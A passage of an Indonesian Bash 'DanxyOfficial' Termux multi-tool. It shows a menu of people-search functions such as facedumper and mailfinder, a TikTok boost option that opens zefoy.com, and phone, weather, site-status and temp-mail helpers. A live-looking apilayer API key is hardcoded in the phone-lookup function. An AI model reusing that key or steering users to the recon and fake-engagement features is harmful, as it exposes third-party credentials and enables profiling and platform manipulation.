  curl -s "${GITHUB_API_URL/\{\}/$user}" | jq .
  pause
}

# -----------------------------------------------------------------------------
# 11. Disposable mailbox (1secmail)
# -----------------------------------------------------------------------------
tempmail() {
  require_jq || return
  login=$(LC_ALL=C tr -dc 'a-z0-9' </dev/urandom | head -c10)
  domain="1secmail.com"
  addr="$login@$domain"
  printf '\n\033[92m📧\033[0m Address : \033[93m%s\033[0m\n' "$addr"
  printf '\033[90mChecking inbox every 3 s (Ctrl-C to quit)…\033[0m\n'

  while true; do
    res=$(curl -s "${TEMPMAIL_API_URL}?action=getMessages&login=$login&domain=$domain")
    if [[ $(jq -r 'type' <<<"$res" 2>/dev/null) == "array" && $res != "[]" ]]; then
      jq -r '.[] | "From:  $.from)\nSubject:  $.subject)\n"' <<<"$res"
    fi
    sleep 3
  done
}

# ---- loop utama ----
while true; do
    menu
    read -rp "Select option : " opt
    case "$opt" in
        01|1) klik; userrecon ;;
        02|2) klik; facedumper ;;
        03|3) klik; mailfinder ;;
        04|4) klik; godorker ;;
        05|5) klik; phoneinfo ;;
        06|6) klik; dnslookup ;;
        07|7) klik; whoislookup ;;
        08|8) klik; sublookup ;;
        09|9) klik; hostfinder ;;
        10)   klik; dnsfinder ;;
        11)   klik; riplookup ;;
        12)   klik; iplocation ;;
        13)   klik; bitlybypass ;;
        14)   klik; githublookup ;;
        15)   klik; tempmail ;;
        00|0) echo -e "\n\033[1;91m[!]\033[0m Bye!"; break ;;
        *) salah;  echo -e "\033[1;91m[!]\033[0m Invalid choice"; sleep 1 ;;
    esac
    read -r dummy
done
}


validate_phone_number() {
  [[ "$1" =~ ^08[0-9]{8,11}$ ]] || {
    echo -e "${RED}[ ! ] Nomor telepon Harus 10-11 digit!${NC}"
    return 1
  }
  return 0
}

suntik_tiktok() {
clear
loading
clear
  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
     echo -e "${RED}                                                     
@@@@@@@  @@@  @@@  @@@  @@@@@@@   @@@@@@   @@@  @@@  
@@@@@@@  @@@  @@@  @@@  @@@@@@@  @@@@@@@@  @@@  @@@  
  @@!    @@!  @@!  !@@    @@!    @@!  @@@  @@!  !@@  
  !@!    !@!  !@!  @!!    !@!    !@!  @!@  !@!  @!!  
  @!!    !!@  @!@@!@!     @!!    @!@  !@!  @!@@!@!   
  !!!    !!!  !!@!!!      !!!    !@!  !!!  !!@!!!    
  !!:    !!:  !!: :!!     !!:    !!:  !!!  !!: :!!   
  :!:    :!:  :!:  !:!    :!:    :!:  !:!  :!:  !:!  
  ::     ::   ::  :::     ::    ::::: ::   ::  :::  
  :     :       :   :::     :      : :  :   :   :::  
                                                     ${NC}" | lolcat
  xdg-open "https://zefoy.com/" &
}

cek_provider() {
  clear
  read -p "Masukkan Nomor Telepon (08xxxxxxxxxx): " nomor
  loading

  validate_phone_number "$nomor" || return 1

  API_KEY="INK824D4fh7FGY0v00QY9aUO1T75JCih"

  response=$(curl -s --fail \
    --url "https://api.apilayer.com/number_verification/validate?number=$nomor&country_code=ID" \
    --header "apikey: $API_KEY") || {
      echo -e "${RED}Gagal menghubungi API${NC}"
      return 1
  }

  # Ekstrak nilai yang diperlukan
  local_format=$(echo "$response" | jq -r '.local_format // "Tidak diketahui"')
  carrier=$(echo "$response" | jq -r '.carrier // "Tidak diketahui"')
  location=$(echo "$response" | jq -r '.location // ""')
  line_type=$(echo "$response" | jq -r '.line_type // "Tidak diketahui"')

  # Jika lokasi kosong, tampilkan "Tidak diketahui"
  [[ -z "$location" || "$location" == "null" ]] && location="Tidak diketahui"

  loading
  echo -e "${CYAN}
  ╭─────────────────────────────╮
  │   ${YELLOW}HASIL CEK PROVIDER${CYAN}        │
  ╰─────────────────────────────╯${NC}"

  echo -e "${GREEN}Nomor   : ${local_format}${NC}"
  echo -e "${GREEN}Provider: ${carrier}${NC}"
  echo -e "${GREEN}Lokasi  : ${location}${NC}"
  echo -e "${GREEN}Jenis   : ${line_type}${NC}"

  echo -e "${CYAN}
  ╭─────────────────────────────╮
  │   ${YELLOW}DANXY OFFICIAL 80${CYAN}         │
  ╰─────────────────────────────╯${NC}"
}



# Fungsi info tools
info() {
  clear
echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣄⣤⣤⣦⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⡗⠉⢹⣯⣿⡽⣷⣟⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠊⠁⠀⠀⠀⠑⠢⢄⠀⠀⠀⠀⠀⡖⡔⣆⢖⢔⢆⢖⢔⢆⢖⢔⢆⢖⢔⢆⢖⢔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⠿⠾⠽⠷⣻⣽⢿⡾⣷⡇⠀⠀⠀⠀⠀⠀⡠⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠤⡀⠀⡳⡹⡸⡜⣕⢝⡜⣕⢇⢇⢇⢇⢇⢇⢇⢏⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣔⣶⣶⣾⢶⣶⣶⣶⡷⣾⣽⣟⣿⣽⡇⢐⢐⠐⠠⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣮⠂⡪⣣⢳⠁⢀⠁⠈⠀⠁⠀⠁⠀⠁⠈⡎⡎⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡾⣟⣯⣷⢿⣻⣽⡷⣟⣿⣽⡾⣯⣷⣟⡇⢀⠢⠨⢈⢂⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⡽⣞⣷⣻⠄⢸⢜⢎⡂⠀⢢⡣⣣⢣⡒⡲⡰⡒⡜⡜⣜⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡿⣯⣿⣻⡿⠝⠛⠛⠝⠚⠛⠫⠓⠋⡀⡂⠌⠌⡐⠄⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⣲⢯⢿⡽⣽⣻⣞⣾⠁⢸⢸⡱⠅⡀⢈⠨⠈⠈⠈⠈⠈⠈⢘⢜⢜⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣟⣿⢾⡻⠀⠄⠅⠅⡊⠌⠌⠌⡐⡁⡂⠔⠡⠨⠠⢑⡇⠀⠀⠀⠀⠀⠀⠀⠀⡷⡯⠏⡫⣟⣷⣳⣟⣾⠁⠨⡪⡎⡧⡰⡠⡢⡤⠥⠤⢤⠀⠀⢸⢸⢱⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠺⣯⢿⣻⡇⠈⢌⢐⢁⠂⠅⡊⡐⡐⡐⠠⠡⠡⠡⢁⠂⡇⠀⠀⠀⠀⠀⠀⠀⠀⡿⣭⢘⠹⣻⣞⣗⡷⣯⠃⠀⡏⡮⣒⠀⢀⠳⢭⠭⡹⡨⠀⠀⢕⢕⡳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠙⠉⠃⢈⠐⠄⡂⠅⡁⡀⠠⢀⢀⠁⠁⠁⠈⠀⠀⠘⠤⡀⠀⠀⠀⠀⠀⠀⡿⣝⠙⣼⣝⡮⣞⡯⠏⠀⠀⡣⡳⡱⣀⠠⠀⡀⠁⠀⠀⢀⢀⢇⢇⢗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⢁⠅⡂⠅⡂⠌⠌⠀⠂⠅⠀⠀⠀⠀⠀⠀⠀⠈⠑⠢⣀⠀⠀⠀⡿⣽⣻⣺⠳⠋⠁⠀⠀⠀⠀⢕⢝⢎⢮⢝⢕⢖⢕⢜⢜⢜⢜⢜⡜⡕⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠁⢂⠂⠅⡂⠅⡂⡂⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠄⡯⠗⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠋⠪⠪⢣⢳⡱⡕⡕⠇⠏⠊⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⢠⣦⣴⣤⣄⠀⢤⣦⣴⣄⠀⢴⣴⣤⢰⣴⡤⣰⣴⣤⣦⣦⡦⣴⣤⣦⣴⣤⠀⢠⣦⣴⣤⣦⢀⣠⣦⣦⣄⠀⢀⣤⣦⣦⣀⢠⣦⣦⡄⠀⣠⣦⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⢈⣿⡧⢹⣿⡇⢰⣟⣿⣿⠀⢨⣿⣿⣧⣿⠅⠀⢻⣿⣾⡋⠀⠙⣿⣷⠟⠀⠀⠘⠫⣿⣏⠛⢸⣿⡇⢸⣿⣇⣿⣿⠀⣿⣿⠀⣿⣿⢀⡀⢿⣷⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⢰⣿⣷⣾⠿⠣⣾⣯⢽⣿⣧⢴⣿⡜⣿⣿⠅⣶⣿⡭⣿⣷⡆⠀⣾⣿⣇⠀⠀⠀⣸⣿⣷⡀⠘⢿⣧⣾⠿⠃⠻⣿⣦⡿⠟⢰⣿⣿⣾⣇⣷⣯⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     " | lolcat
  loading
  clear
  echo -e "${RED}
  ╭────────────────────────────────────────╮
  │              ${BLUE}INFO TOOLS${RED}                │
  ╰────────────────────────────────────────╯
  ${NC}"

  echo -e "${GREEN}
Tools ini dikembangkan oleh DanxyOfficial
untuk tujuan edukasi dan eksplorasi teknologi.

[ ∅ ] ${BOLD}${RED}Tujuan Utama:${GREEN}
 - Mendorong pembelajaran seputar keamanan digital
 - Membantu pengguna memahami potensi celah sistem secara etis
 - Melatih keterampilan pencarian data terbuka (OSINT)
 - Menyediakan media belajar scripting & automasi di Termux

[ ∅ ] ${BOLD}${RED}Penggunaan Bertanggung Jawab:${GREEN}
   Tools ini hanya diperuntukkan untuk:
 - Edukasi & eksplorasi pribadi
 - Pengujian sistem milik sendiri (authorized testing)
 - Eksperimen dalam ruang lingkup legal

[ ∅ ] ${BOLD}${RED}Dilarang keras:${GREEN}
 - Menggunakan tools untuk tindak ilegal
   (peretasan, penipuan, penyalahgunaan data)
 - Melanggar privasi pihak lain tanpa izin
 - Menjual atau menyebarluaskan ulang tanpa izin dari pembuat
 - Menghapus atau mengubah nama pembuat (credit)

[ ∅ ] ${BOLD}${RED}Peringatan:${GREEN}
 Penyalahgunaan tools ini 
 dapat menimbulkan konsekuensi hukum.
 Jadilah pengguna yang bijak dan bertanggung jawab.

[ ∅ ] ${BOLD}${RED}Kontak & Support Resmi:${GREEN}
  - YouTube : ${YELLOW}https://www.youtube.com/@DanxyOfficial${GREEN}
  - Telegram: ${YELLOW}t.me/DanxyStore${GREEN}
  - TikTok  : ${YELLOW}Qwela.38${GREEN}

  ${YELLOW}${BOLD}Terima kasih telah menggunakan tools ini secara positif.
  Semoga memberikan manfaat dan wawasan baru untukmu.${GREEN}
  ${NC}"

  echo -e "${RED}
  ╭────────────────────────────────────────╮
  │          ${BLUE}DANXY OFFICIAL 80${RED}             │
  ╰────────────────────────────────────────╯
  ${NC}"
}

kembali_ke_menu() {
  read -n 1 -s -r -p "TEKAN ENTER UNTUK KEMBALI KE MENU AWAL" | lolcat
  echo
}

#show_whatsapp_support() {
#  echo -e "${BLUE}JANGAN LUPA JOIN CHANNEL DanxyBot YHA MAKASIH${NC}" | lolcat
#  xdg-open "$WHATSAPP_CHANNEL_URL" &
#  sleep 5
#}

kasi_warna_green() {
  echo -e "${GREEN}$1${NC}"
}

perkiraan_cuaca() {
clear
  echo -e "
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡀⠀⢀⣠⣤⣤⣴⣤⣦⣤⣤⣤⣀⡀⠀⠤⠤⡤⠂⠀⠀⠈⠙⠒⠒⠦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣡⣶⣿⣿⢿⣛⠿⣩⢯⡙⢯⣛⣟⡻⢿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣼⣿⡿⣟⠧⠛⢉⣀⡦⢤⠦⡴⢤⢤⣀⡉⠳⠮⣛⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀⠀
⠀⠀⠀⠀⢀⣼⣿⠿⡽⠃⣁⡴⢛⣩⣦⣵⣾⣶⣷⣾⣦⣼⣉⡓⢦⣈⠛⢼⣻⣿⣦⡀⠀⠀⠀⠀⠀⠀⣠⢨⠇⠀⠀
⠀⠀⠐⢠⣿⣿⣛⠋⣠⢞⣱⣼⡿⣟⡯⣏⠷⠽⠮⠷⣫⠿⠿⠻⢶⣌⠳⡄⠳⣭⣿⣷⡀⢤⣀⣀⡠⣪⠑⠁⠀⠀⠀
⠀⠀⢰⣿⣿⠿⠁⡴⣃⣾⣿⢯⡻⠙⠈⠀⠀⢀⡴⠂⠁⠀⠀⠀⠀⠈⠉⠺⡧⠜⠿⠿⣿⡴⠤⠤⠒⠁⠀⠀⠀⠀⠀
⠀⠂⣾⡿⢯⠃⣸⢓⣾⡿⣽⢞⠄⠤⠂⠤⢤⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡀⠁⠀⠀⠀⠀⠀⠀⠀
⢠⢸⣿⣏⡏⢀⡧⢻⣽⣻⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣗⠀⠀⠀⠀⠀⠀⠀⠀
⢠⢸⣿⣎⡇⢸⡜⣿⣟⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠤⢤⣀⠀⠀⠀⠀⠀
⢄⢸⣿⣎⡗⠘⣦⢹⣾⣟⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⣀⠀⠀⠀⠀⣠⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠈⠙⢦⡀⠀⠀
⠀⠊⣿⣷⢺⡄⡳⠝⠋⠛⠀⠀⠀⠀⠀⠘⢧⡀⢀⡰⠏⠀⠀⠀⠀⠘⢧⡄⢀⣤⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀
⠀⠀⠸⣿⡧⠋⠀⠀⠀⠀⠀⠀⠀⢠⢴⢰⣦⠍⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⣆⡦⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀
⠀⠀⠀⢹⡁⠀⠀⠀⠀⠀⠀⠀⠀⠙⠘⠛⠁⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠈⠙⠛⠙⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃
⠀⠀⠀⢸⡀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣝⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⡾⠀
⠀⠀⠀⠘⡇⠀⠀⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢀⡼⠁⠀
⠀⠀⠀⠀⠘⠦⡀⠀⠉⠓⠂⠄⠂⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢒⠉⣁⠴⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠒⠢⠤⠤⠐⡄⠈⠳⠤⠄⠀⠀⠰⣄⡀⣀⠴⠃⣀⠀⠀⠲⣄⡀⠀⠀⡠⠔⠋⣴⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⢄⡀⠀⠀⠀⠀⠀⠀⣀⠤⠚⠉⢷⣀⠀⠀⠈⠁⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠀⠀⠀⠉⠁⠀⠀⠀⠀⠈⠑⠒⠀⠀⠐⠒⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" | lolcat
echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}CEK PREDIKSI CUACA${CYAN}         │
  ╰────────────────────────────────────────╯${NC}"
  read -p "MASUKAN LOKASI (CONTOH: JAWA TENGAH, BANDUNG): " lokasi

  if ! command_exists curl; then
    echo -e "${RED}curl tidak ditemukan. Instal curl untuk menggunakan fitur ini.${NC}"
    return 1
  fi

  # Periksa koneksi internet (contoh sederhana)
  if ! ping -c 1 google.com > /dev/null; then
    echo -e "${RED}Tidak ada koneksi internet. Periksa koneksi Anda dan coba lagi.${NC}"
    return 1
  fi

  cuaca=$(curl -s "http://wttr.in/$lokasi?format=%l:+%C+%t")

  if [ -z "$cuaca" ]; then
    echo -e "${RED}Tidak dapat menemukan informasi cuaca untuk lokasi '$lokasi'. Pastikan lokasi yang Anda masukkan benar dan coba lagi.${NC}"
    return 1
  fi

  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │        ${YELLOW}PERKIRAAN CUACA${CYAN}           │
  ╰────────────────────────────────────────╯${NC}"

  echo -e "${GREEN}$cuaca${NC}"

  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
}


cek_status_website() {
  clear 
  echo -e "
  
                                                                            
   _|_|_|   _|_|_|_|   _|    _|       _|          _|   _|_|_|_|   _|_|_|    
 _|         _|         _|  _|         _|          _|   _|         _|    _|  
 _|         _|_|_|     _|_|           _|    _|    _|   _|_|_|     _|_|_|    
 _|         _|         _|  _|           _|  _|  _|     _|         _|    _|  
   _|_|_|   _|_|_|_|   _|    _|           _|  _|       _|_|_|_|   _|_|_|" | lolcat
  echo -e "${BG_RED}${YELLOW}CUBIT LAYAR UNTUK MENYESUAIKAN${NC}"
  read -p "Masukkan URL website yang ingin diperiksa (contoh: https://www.google.com): " url
  # Cek apakah curl tersedia
  if ! command -v curl &> /dev/null; then
    echo -e "${RED}curl tidak ditemukan. Instal curl untuk menggunakan fitur ini.${NC}"
    return 1
  fi

  # Cek jika input kosong
  if [ -z "$url" ]; then
    echo -e "${RED}URL tidak boleh kosong.${NC}"
    return 1
  fi

  echo -e "${GREEN}Memeriksa status website...${NC}"

  # Kirim permintaan HEAD untuk mendapatkan status HTTP
  status=$(curl -s -o /dev/null -w "%{http_code}" "$url")

  # Tampilkan hasil
  if [ "$status" -eq 200 ]; then
    echo -e "${GREEN}Website aktif (Status: $status).${NC}"
  else
    echo -e "${RED}Website tidak merespons dengan benar (Status: $status).${NC}"
  fi
}

kalkulator() {
  while true; do
    clear
    echo -e "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠕⣨⣉⠤⠠⡄⢒⠒⣒⢊⠩⠭⠍⠛⣓⠲⢖⣤⠤⠄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠣⣼⠟⠙⠛⠛⠛⠟⠾⠶⣮⣵⣌⣉⣖⣠⣃⠖⡠⠍⢭⠑⣚⠩⣛⠱⢖⣲⢤⣤⣀⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢃⣿⠀⠀⠀⠀⠀⠀⠀⠀⡀⠂⠀⠉⠉⠙⠉⠛⠛⠾⠶⠯⣴⣥⣦⣍⣢⡰⢌⠢⠍⠿⣷⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⢼⡏⠀⠀⠀⠀⠀⠀⡠⠈⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⢻⡜⣰⣿⡧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠘⣢⡙⢻⠓⡶⠶⣤⡦⠤⣄⣀⣀⡀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠰⣸⣿⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⢠⣤⣤⣄⣀⣉⠁⠒⠂⠩⠁⠒⠩⢙⡋⠭⡔⢒⣒⠶⠤⠤⡄⣀⣀⡀⠀⠀⠀⢠⡏⡒⣿⣿⠐
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⢠⣿⣦⡡⢘⠎⣽⣷⡾⣛⡛⡶⠶⢦⣄⣠⣤⣈⣁⡀⠂⠙⠂⠩⠅⠒⣒⠍⠭⠿⢏⠓⡰⣿⡷⠆
⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⣿⣿⣿⣴⣿⣿⣿⣿⣷⡞⠬⢸⣥⣿⣿⣏⡦⢛⠫⣙⣻⣧⣴⠳⠶⢶⣤⣤⣉⠀⠉⠈⢸⣿⠧⠀
⠀⠀⠀⠀⠀⠀⠀⡼⠀⣤⠼⣿⣿⣻⡿⠿⠟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣂⣴⣶⣿⣿⣯⣽⠅⢒⣤⣸⣿⡇⠀⢀⣿⡿⠀⠀
⠀⠀⠀⠀⠀⠀⢰⠃⢰⣏⡦⠐⣹⡉⣿⣷⡾⠛⠛⣾⠿⣭⡛⣁⣻⣿⣿⢿⣿⣿⡿⣿⣿⣿⣾⣾⣷⣿⡿⠀⠀⣼⣷⡇⠂⠀
⠀⠀⠀⠀⠀⢠⠏⢠⣿⣿⣷⣦⣾⣿⣿⣿⣷⡾⡄⢲⣖⣿⣿⡟⣈⠍⢙⢛⢻⣦⣰⠬⢿⣽⣿⣻⡿⠿⠃⠀⢨⣿⡟⠈⠀⠀
⠀⠀⠀⠀⢀⡎⠀⣤⣽⣛⣿⣿⡿⣿⠿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣇⠼⣹⣮⣿⣿⣯⣜⠰⠢⡌⢭⣿⡆⠀⢠⣻⣿⢁⠂⠀⠀
⠀⠀⠀⠀⡾⠁⣸⣣⡤⠂⡩⢉⣿⣆⡶⠲⠿⣽⣿⣟⠛⠃⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣶⣿⣿⣿⠃⠀⣰⣿⡟⠂⠀⠀⠀
⠀⠀⠀⣰⠁⢰⣿⣿⣿⣰⣿⣻⣿⣿⣥⣭⠤⢘⣠⣿⣷⡯⢉⠛⠻⠾⢿⣍⢁⣙⣟⣻⡿⢿⣿⣿⠏⠀⠰⣽⣿⠁⠀⠀⠀⠀
⠀⠀⢰⠃⠀⣈⣻⠿⢿⣿⣿⣿⢿⣿⣿⣧⣬⣿⣿⣿⣿⣶⡯⠿⢠⣇⣿⣿⡿⢠⢌⡍⢛⢛⣷⣄⠀⠀⣹⣿⡏⠂⠀⠀⠀⠀
⠀⢠⡟⠀⣼⡋⡭⡭⡛⢛⣷⣁⣤⢭⣛⣿⣿⠿⡿⠿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣦⣼⣾⣼⣿⡇⠀⡐⣿⡿⠀⠀⠀⠀⠀⠀
⠀⡞⠀⢸⣿⣿⡰⢃⣷⣯⣿⣿⣲⠲⡂⡩⢩⣿⣦⡶⠺⠽⣭⣿⣛⡿⠟⠻⣿⣿⣿⣿⣿⣿⡿⠀⠐⣼⣿⢇⠁⠀⠀⠀⠀⠀
⣼⠁⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣩⣚⣹⣿⣿⣿⡵⣬⠦⣔⡌⣽⣿⡾⠙⠛⠲⠻⠭⣝⡛⠁⠀⢌⣿⡟⠀⠀⠀⠀⠀⠀⠀
⣿⣄⠤⢀⡀⠀⠉⠉⠛⠛⠘⠿⢿⣿⣿⣿⣿⢿⣿⣿⣿⣶⣿⣿⣿⣿⢁⡰⠥⢔⣀⠀⣾⡷⠀⠈⣼⣿⠡⠀⠀⠀⠀⠀⠀⠀
⠘⢿⣿⣽⣞⣶⢶⣭⣔⣂⣠⡀⠀⠀⡈⠉⠉⠈⠛⠿⠿⢿⣿⣿⡿⣧⣷⣜⣆⢦⡑⣾⣿⠁⢀⢺⣿⡏⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠀⠈⠩⠝⢛⠚⠷⢿⣭⣟⣿⣷⠶⣮⣥⣤⣀⣂⠠⠄⢀⠈⠀⠈⠛⠛⠻⠿⣿⣿⠏⠀⢌⣾⣿⡐⠀⠀⠀⠀⠀⠀⠀⠀
